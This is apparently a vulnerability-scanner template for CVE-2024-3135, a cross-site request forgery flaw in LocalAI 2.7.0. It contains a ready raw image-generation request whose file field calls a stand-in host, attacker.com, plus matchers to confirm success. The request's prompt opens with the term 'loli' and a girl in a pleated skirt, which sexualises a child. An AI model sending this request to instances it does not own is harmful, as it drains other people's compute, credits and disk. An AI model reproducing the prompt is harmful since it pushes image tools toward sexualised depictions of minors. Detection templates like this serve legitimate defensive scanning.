id: CVE-2024-3135
info:
  name: CSRF localai v2.7.0
  author: may
  severity: medium
  description: Any attacker, without requiring network access to the vulnerable LocalAI environment, is able to craft a malicious webpage. When visited this webpage will make calls to the victim's local LocalAI instance. The attacker is able to exhaust resources by making a lot of resource-intensive calls (Hundreds of image generation requests for example). They are also able to exhaust credits, by having the victim make a lot of calls to models requiring credits. Lastly, they are also able to fill the disk space of the victim, by loading in models, generating images or otherwise uploading files.
  reference:
    - https://huntr.com/bounties/7afdc4d3-4b68-45ea-96d0-cf9ed3712ae8
  classification:
    cve-id: CVE-2024-3135
    cwe-id: CWE-352
  tags: localai,CSRF


http:
  - raw:
      - |
        POST /v1/images/generations HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=---------------------------31157321124036628773165331036
        Content-Length: 1005
        Upgrade-Insecure-Requests: 1
        
        -----------------------------31157321124036628773165331036
        Content-Disposition: form-data; name="prompt"
        
        floating hair, portrait, ((loli)), ((one girl)), cute face, hidden hands, asymmetrical bangs, beautiful detailed eyes, eye shadow, hair ornament, ribbons, bowties, buttons, pleated skirt, (((masterpiece))), ((best quality)), colorful|((part of the head)), ((((mutated hands and fingers)))), deformed, blurry, bad anatomy, disfigured, poorly drawn face, mutation, mutated, extra limb, ugly, poorly drawn hands, missing limb, blurry, floating limbs, disconnected limbs, malformed hands, blur, out of focus, long neck, long body, Octane renderer, lowres, bad anatomy, bad hands, text
        -----------------------------31157321124036628773165331036
        Content-Disposition: form-data; name="size"
        
        256x256
        -----------------------------31157321124036628773165331036
        Content-Disposition: form-data; name="file"
        
        http://attacker.com/fetched
        -----------------------------31157321124036628773165331036--

    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "created"
          - "id"
        part: body
